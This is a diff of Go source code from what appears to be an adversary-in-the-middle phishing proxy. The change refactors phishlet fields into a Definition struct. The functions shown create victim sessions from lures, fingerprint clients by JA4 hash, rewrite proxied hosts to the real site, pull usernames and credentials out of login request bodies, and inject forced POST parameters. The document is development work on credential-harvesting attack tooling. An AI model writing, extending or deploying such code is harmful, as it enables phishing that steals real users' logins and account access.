@@ -272,7 +272,7 @@ func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 			return initSpoofLure, nil
 		}
 
-		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, firstReq.UserAgent(), lure.ID, phishlet.Name)
+		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, firstReq.UserAgent(), lure.ID, phishlet.Definition.Name)
 		if err != nil {
 			return initFailed, fmt.Errorf("creating session: %w", err)
 		}
@@ -290,7 +290,7 @@ func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 
 	// 6. Look up puppet override.
 	if c.server.PuppetSvc != nil {
-		c.puppetOverride = c.server.PuppetSvc.GetOverride(phishlet.Name)
+		c.puppetOverride = c.server.PuppetSvc.GetOverride(phishlet.Definition.Name)
 	}
 
 	return initOK, nil
@@ -298,8 +298,8 @@ func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 
 // matchIntercept returns the first matching intercept rule, or nil.
 func (c *connection) matchIntercept(r *http.Request) *aitm.InterceptRule {
-	for i := range c.phishlet.Intercepts {
-		rule := &c.phishlet.Intercepts[i]
+	for i := range c.phishlet.Definition.Intercepts {
+		rule := &c.phishlet.Definition.Intercepts[i]
 		if !rule.Path.MatchString(r.URL.Path) {
 			continue
 		}
@@ -320,8 +320,8 @@ func (c *connection) rewriteLurePath(r *http.Request) {
 	}
 
 	landingPath := "/"
-	if c.phishlet.Login.Path != "" {
-		landingPath = c.phishlet.Login.Path
+	if c.phishlet.Definition.Login.Path != "" {
+		landingPath = c.phishlet.Definition.Login.Path
 	}
 	r.URL.Path = landingPath
 }
@@ -353,7 +353,7 @@ func (c *connection) shouldSpoof() bool {
 }
 
 func (c *connection) rewriteURL(r *http.Request) {
-	if ph := c.phishlet.FindProxyHost(r.Host); ph != nil {
+	if ph := c.phishlet.Definition.FindProxyHost(r.Host, c.phishlet.Config.BaseDomain); ph != nil {
 		origin := ph.OriginHost()
 		r.Host = origin
 		r.URL.Host = origin
@@ -370,7 +370,7 @@ func (c *connection) extractCredentials(r *http.Request) {
 		return
 	}
 
-	login := c.phishlet.Login
+	login := c.phishlet.Definition.Login
 	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(r.Host)), strings.ToLower(login.Domain)) {
 		return
 	}
@@ -381,7 +381,7 @@ func (c *connection) extractCredentials(r *http.Request) {
 	}
 
 	updated := false
-	rules := c.phishlet.Credentials
+	rules := c.phishlet.Definition.Credentials
 
 	if username := extractField(rules.Username, body); username != "" && c.session.Username == "" {
 		c.session.Username = username
@@ -421,7 +421,7 @@ func (c *connection) injectForcePost(r *http.Request) {
 		return
 	}
 
-	for _, forcePost := range c.phishlet.ForcePosts {
+	for _, forcePost := range c.phishlet.Definition.ForcePosts {
 		if !forcePost.Path.MatchString(r.URL.Path) {
 			continue
 		}
